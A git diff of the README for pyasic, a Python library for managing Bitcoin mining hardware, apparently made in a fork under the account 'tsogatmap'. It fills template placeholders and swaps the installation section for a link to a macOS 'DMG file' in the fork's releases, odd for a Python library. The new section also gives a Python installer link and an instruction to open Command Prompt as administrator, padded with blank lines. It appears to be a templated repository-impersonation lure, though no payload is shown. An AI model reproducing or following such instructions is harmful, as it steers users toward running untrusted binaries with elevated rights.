@@ -1,18 +1,18 @@
 # pyasic: 
 *A simplified and standardized interface for Bitcoin ASICs.*
 
-An asynchronous Python library for managing and monitoring Bitcoin mining hardware.
+An asynchronous  Python library for managing and monitoring Bitcoin mining hardware.
 
 [![PyPI - Version](https://img.shields.io/pypi/v/pyasic.svg)](https://pypi.org/project/pyasic/)
 [![PyPI - Downloads](https://img.shields.io/pypi/dm/pyasic)](https://pypi.org/project/pyasic/)
 
 [![Python - Supported Versions](https://img.shields.io/pypi/pyversions/pyasic.svg)](https://pypi.org/project/pyasic/)
 [![CodeFactor - Grade](https://img.shields.io/codefactor/grade/github/UpstreamData/pyasic)](https://www.codefactor.io/repository/github/upstreamdata/pyasic)
-[![Commit Activity - master](https://img.shields.io/github/commit-activity/y/__USERNAME__/__REPONAME__)](https://github.com/__USERNAME__/__REPONAME__/commits/master/)
+[![Commit Activity - master](https://img.shields.io/github/commit-activity/y/tsogatmap/pyasic)](https://github.com/tsogatmap/pyasic/commits/master/)
 
 [![Code Style - Black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
 [![Read The Docs - Docs](https://img.shields.io/readthedocs/pyasic)](https://docs.pyasic.org)
-[![License - Apache 2.0](https://img.shields.io/github/license/__USERNAME__/__REPONAME__)](https://github.com/__USERNAME__/__REPONAME__/blob/master/LICENSE.txt)
+[![License - Apache 2.0](https://img.shields.io/github/license/tsogatmap/pyasic)](https://github.com/tsogatmap/pyasic/blob/master/LICENSE.txt)
 
 ---
 ## Intro:
@@ -24,7 +24,23 @@ Welcome to `pyasic`!  `pyasic` uses an asynchronous method of communicating with
 ---
 
 ## **Installation Info:** 
----placeholder-how-to-setup-git-python---
+The guide below is for Windows and Linux; macOS users have a [DMG file](../../releases).
+
+
+
+
+
+Make sure Git & Python are configured on Windows.
+
+Link for Git: https://git-scm.com/install/windows
+
+Link for Python: https://www.python.org/ftp/python/3.13.12/python-3.13.12-amd64.exe
+
+Proceed to open Command Prompt as administrator.
+
+
+
+
 
 
 It is recommended to install `pyasic` in a [virtual environment](https://realpython.com/python-virtual-environments-a-primer/#what-other-popular-options-exist-aside-from-venv) to isolate it from the rest of your system. Options include:
